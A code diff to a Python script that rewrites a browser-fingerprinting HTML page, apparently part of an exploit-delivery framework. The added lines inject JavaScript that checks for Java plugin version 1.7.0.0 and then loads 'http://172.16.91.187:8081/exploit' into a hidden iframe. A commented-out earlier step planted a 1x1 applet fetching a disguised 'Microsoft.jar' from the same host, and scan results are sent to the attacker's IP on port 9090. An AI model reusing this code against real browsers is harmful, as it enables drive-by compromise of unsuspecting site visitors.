@@ -75,10 +75,20 @@ def modifyHTML(filename):
 		if '$.get(' in line:
 			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params, function(data) {"
 			content.append(replaceLine)
-		elif '<body>' in line:
+		elif line.strip()=="//plugins":
 			content.append(line)
-			if javaSelfsigned==True:
-				content.append('<applet archive="http://'+ipAddr+':8081/java/Microsoft.jar" code="Microsoft" width="1" height="1"></applet>')
+			content.append("\t\tif(plugins[ao[i]]=='java'){\n")
+			content.append("\t\t\tif(BrowserScanHostDetails[ao[i]]=='1,7,0,0'){\n")
+			content.append("\t\t\t\tvar iframe = document.getElementById('exploit');\n")
+			content.append("\t\t\t\turl = 'http://172.16.91.187:8081/exploit';\n")
+			content.append("\t\t\t\tiframe.setAttribute('src',url);\n")
+			content.append("\t\t\t\tiframe.contentDocument.location.reload(true);\n")
+			content.append("\t\t\t}\n")
+			content.append("}\n")
+		#elif '<body>' in line:
+		#	content.append(line)
+		#	if javaSelfsigned==True:
+		#		content.append('<applet archive="http://'+ipAddr+':8081/java/Microsoft.jar" code="Microsoft" width="1" height="1"></applet>')
 		else:
 			content.append(line)
     fo = open("fingerprint.html", "w+") 
